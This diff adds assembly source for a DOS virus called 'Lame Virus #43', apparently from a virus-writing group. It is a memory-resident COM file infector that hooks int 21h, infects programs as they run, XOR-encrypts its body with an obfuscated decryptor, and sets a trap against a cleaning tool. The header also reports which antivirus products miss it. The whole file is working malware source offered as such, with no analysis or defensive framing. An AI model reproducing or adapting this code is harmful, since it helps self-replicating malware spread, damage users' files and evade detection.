@@ -1,0 +1,196 @@
+Lame Virus #43
+Executioner
++------------------------------------------------------------------------------+
+| Lame Virus #43							       |
+| by Executioner/LT							       |
+|   o resident parasitic COM infector					       |
+|   o odd decryption loop - builds instructions as they are needed	       |
+|   o F-Prot scans the original sample as a possible variant of Golgi, and     |
+|     detects all of them in heuristic mode.				       |
+|   o TBAV detects the original sample, but only raises the E flag on infected |
+|     files.  TBCLEAN cannot remove this virus. 			       |
+|   o DSAVTK cannot detect anything in scanning mode, but detects all of them  |
+|     in heuristic mode.						       |
++------------------------------------------------------------------------------+
+
+.model	tiny
+.386
+v_length equ	v_finish-v_start
+e_length equ	v_finish-e_start
+m_length equ	m_finish-v_start
+num_para equ	(m_length+15)/16
+cseg	segment use16
+	assume	cs:cseg,ds:cseg,es:cseg,ss:cseg
+	org	0
+v_start:
+	call	delta
+delta:
+	pop	bp
+	sub	bp, offset delta
+	mov	byte ptr [bp+instruction], 0beh     ; mov si, xxxx
+	mov	word ptr [bp+instruction+1], offset e_start+100h
+m_loc1:
+	mov	byte ptr [bp+instruction+3], 0c3h
+	call	instruction
+	mov	byte ptr [bp+instruction], 0bfh     ; mov di, xxxx
+	mov	word ptr [bp+instruction+1], offset e_start+100h
+m_loc2:
+	mov	byte ptr [bp+instruction+3], 0c3h
+	call	instruction
+	mov	byte ptr [bp+instruction], 0b9h     ; mov cx, xxxx
+	mov	word ptr [bp+instruction+1], e_length
+	mov	byte ptr [bp+instruction+3], 0c3h
+	call	instruction
+d_loop:
+	mov	word ptr [bp+instruction], 0c3ach   ; lodsb
+	call	instruction
+	mov	byte ptr [bp+instruction], 34h	    ; xor al, xx
+	mov	word ptr [bp+instruction+1], 0c300h
+m_loc3:
+	call	instruction
+	mov	word ptr [bp+instruction], 0c3aah   ; stosb
+	call	instruction
+	mov	byte ptr [bp+instruction], 0e2h
+	mov	byte ptr [bp+instruction+1], -(offset instruction+2-offset d_loop)
+	mov	word ptr [bp+instruction+2], 9090h
+instruction:
+	nop
+	nop
+	nop
+	nop
+e_start:
+	cli				; cheap TBCLEAN trap
+	neg	sp
+	neg	sp
+	sti
+	mov	ax, 42ffh		; installation check
+	int	21h
+	cmp	bx, 1234
+	je	return
+	mov	ax, ds			; get the segment of the MCB in DS
+	dec	ax
+	mov	ds, ax
+	mov	byte ptr ds:[0], 'Z'    ; get some free memory for the virus
+	sub	word ptr ds:[3], num_para+1
+	sub	word ptr ds:[12h], num_para+1
+	mov	ax, word ptr ds:[12h]
+	mov	ds, ax			; DS=MCB of allocated memory
+	mov	byte ptr ds:[0], 'Z'    ; build a new MCB
+	mov	word ptr ds:[1], 8
+	mov	word ptr ds:[3], num_para
+	inc	ax			; ES=allocated memory
+	mov	es, ax
+	push	cs			; DS:SI=virus body
+	pop	ds
+	sub	di, di
+	mov	si, bp
+	push	di
+	mov	cx, v_length		; copy the virus to high mem
+	rep	movsb
+	pop	ds
+	mov	si, 84h 		; save the original int 21h address
+	mov	di, offset old_int21
+	movsw
+	movsw
+	cli				; install a new int 21h handler
+	mov	word ptr ds:[84h], offset new_int21
+	mov	word ptr ds:[86h], es
+	sti
+	push	cs			; set DS/ES to CS (normal for COM)
+	pop	ds
+	push	cs
+	pop	es
+return:
+	lea	si, [bp+save]		; copy the original data to CS:100h
+	mov	di, 100h
+	movsw
+	movsb
+	push	100h			; transfer control to CS:100h
+	retn
+save	db	0cdh, 20h, 90h		; fake original bytes
+jmp_code db	0e9h
+jmp_offset dw	?
+installation_check:
+	mov	bx, 1234		; report that the virus is resident
+	popf
+	iret
+new_int21:
+	pushf				; save the flags
+	cmp	ax, 42ffh		; is in an installation check?
+	jz	installation_check
+	cmp	ax, 4b00h		; is a file being executed?
+	jnz	do_orig_int
+	call	infect_file
+do_orig_int:
+	popf				; restore the flags
+	jmp	dword ptr cs:[old_int21]
+infect_file:
+	pusha				; save the registers
+	push	ds
+	push	es
+	mov	ax, 3d02h		; open the file in read/write
+	int	21h
+	xchg	bx, ax			; put the file handle in BX
+	push	cs			; set ES/DS to virus segment
+	pop	ds
+	push	cs
+	pop	es
+	mov	ah, 3fh 		; read first 3 bytes from file
+	mov	cx, 3
+	mov	dx, offset save
+	int	21h
+	cmp	byte ptr [save], 0e9h	; check if it's infected already
+	jz	already_infected
+	mov	ax, 4202h		; seek to the end of the file
+	sub	cx, cx
+	cwd
+	int	21h
+	sub	ax, 3			; build a JMP instruction
+	mov	[jmp_offset], ax
+; now encrypt the virus using XOR
+	add	ax, 3+offset e_start+100h
+	mov	word ptr [m_loc1-2], ax
+	mov	word ptr [m_loc2-2], ax
+
+	in	al, 40h 		; get random number
+
+	mov	byte ptr [m_loc3-2], al
+
+	mov	dl, al
+	mov	si, offset e_start
+	mov	di, offset e_buffer
+	mov	cx, e_length
+e_loop:
+	lodsb
+	xor	al, dl
+	stosb
+	loop	e_loop
+	mov	ah, 40h
+	mov	cx, offset e_start
+	sub	dx, dx
+	int	21h
+	mov	ah, 40h 		; write the virus body
+	mov	cx, e_length
+	mov	dx, offset e_buffer
+	int	21h
+	mov	ax, 4200h		; seek to the start of the file
+	sub	cx, cx
+	cwd
+	int	21h
+	mov	ah, 40h 		; write a jump to the file start
+	mov	cx, 3
+	mov	dx, offset jmp_code
+	int	21h
+already_infected:
+	mov	ah, 3eh 		; close the current file handle
+	int	21h
+	pop	es			; restore the registers
+	pop	ds
+	popa
+	retn
+v_finish:
+old_int21 dd	?
+e_buffer db	e_length dup (0)
+m_finish:
+cseg	ends
+	end	v_start
